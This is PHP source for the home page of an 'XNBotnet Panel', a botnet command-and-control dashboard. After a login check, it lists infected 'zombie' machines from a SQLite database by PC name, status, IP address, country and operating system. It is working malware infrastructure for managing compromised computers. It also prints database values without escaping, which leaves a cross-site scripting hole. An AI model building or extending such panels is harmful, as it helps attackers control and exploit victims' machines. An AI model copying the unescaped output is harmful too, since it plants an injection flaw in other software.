<?php
session_start();

if (!isset($_SESSION["username"])) {
    header("Location: login"); 
    exit();
}

?>

<!DOCTYPE html>
<html lang="en">
    <head>
        <title>Home</title>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <link rel="stylesheet" href="../static/css/index.css" />
    </head>
    <body>
        <header>XNBotnet Panel</header>
        <main class="contents">
            <table class="tbl-zombies">
                <tr>
                    <th>PC Name</th>
                    <th>Status</th>
                    <th>IP Address</th>
                    <th>Country</th>
                    <th>Operating System</th>
                    <th>Options</th>
                </tr>
                <tr>
                    <?php 
                        $zombie_db = new PDO("sqlite:/var/www/html/C2Panel/db/zombie.db");
                        $query = $zombie_db->query("SELECT pc_name, status, ip, country, os FROM zombies"); 
                        while($row = $query->fetch(PDO::FETCH_ASSOC)){
                            echo "<td>".$row["pc_name"]."</td>";
                            echo "<td>".$row["status"]."</td>";
                            echo "<td>".$row["ip"]."</td>";
                            echo "<td>".$row["country"]."</td>";
                            echo "<td>".$row["os"]."</td>";
                            echo "<td>"."<button>"."</td>";
                        }
                    ?>
                </tr>
            </table>
        </main>
    </body>
</html>